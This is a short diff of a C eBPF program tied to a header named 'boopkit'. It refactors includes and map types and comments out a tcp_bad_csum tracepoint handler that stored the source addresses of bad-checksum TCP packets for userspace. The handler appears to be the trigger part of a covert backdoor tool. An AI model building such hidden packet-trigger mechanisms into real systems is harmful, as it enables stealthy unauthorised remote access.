@@ -28,23 +28,18 @@
 // to userspace!
 //
 // clang-format off
-#include <linux/bpf.h>
+#include "vmlinux.h"
+// clang-format on
 #include <bpf/bpf_helpers.h>
-// clang-format on
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <stdbool.h>
-#include <stdio.h>
 #include <string.h>
-// clang-format off
+
 #include "boopkit.h"
-// clang-format on
 
 struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 128);
   __type(key, int);
-  __type(value, struct tcp_return);
+  __type(value, struct encapsulated_tcp_boop);
 } boopproto SEC(".maps");
 
 struct tcp_bad_csum_args_t {
@@ -71,14 +66,14 @@ struct tcp_bad_csum_args_t {
 // print fmt: "src=%pISpc dest=%pISpc", REC->saddr, REC->daddr
 SEC("tracepoint/tcp/tcp_bad_csum")
 int tcp_bad_csum(struct tcp_bad_csum_args_t *args) {
-  char saddrvalchar[INET_ADDRSTRLEN];
-  inet_ntop(AF_INET, &args->saddr, saddrvalchar, INET_ADDRSTRLEN);
-  int saddrkey = 1;
-  __u8 saddrval[4];
-  inet_pton(AF_INET, saddrvalchar, saddrval);
-  struct encapsulated_tcp_boop ret;
-  memcpy(ret.saddrval, saddrval, sizeof saddrval);
-  bpf_map_update_elem(&boopproto, &saddrkey, &ret, 1);
+  //  char saddrvalchar[INET_ADDRSTRLEN];
+  //  inet_ntop(AF_INET, &args->saddr, saddrvalchar, INET_ADDRSTRLEN);
+  //  int saddrkey = 1;
+  //  __u8 saddrval[4];
+  //  inet_pton(AF_INET, saddrvalchar, saddrval);
+  //  struct encapsulated_tcp_boop ret;
+  //  memcpy(ret.saddrval, saddrval, sizeof saddrval);
+  //  bpf_map_update_elem(&boopproto, &saddrkey, &ret, 1);
   return 0;
 }
 
